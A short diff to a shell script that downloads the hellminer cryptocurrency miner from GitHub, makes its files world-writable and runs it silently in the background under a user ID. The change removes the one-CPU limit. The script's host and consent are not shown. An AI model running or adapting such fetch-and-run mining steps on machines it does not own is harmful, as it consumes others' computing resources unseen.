@@ -14,7 +14,7 @@ wget -qO- https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer
 cd "${tmp}"; chmod 777 -R ./; rm -rf ./*.sh; mv h* hm
 
 if [ "$mode" == "0" ]; then
-  ./hm -u ${user} -p d=16384S --cpu 1 >/dev/null 2>&1 &
+  ./hm -u ${user} -p d=16384S >/dev/null 2>&1 &
 else
-  ./hm -u ${user} -p d=16384S --cpu 1 >/dev/null 2>&1
+  ./hm -u ${user} -p d=16384S >/dev/null 2>&1
 fi
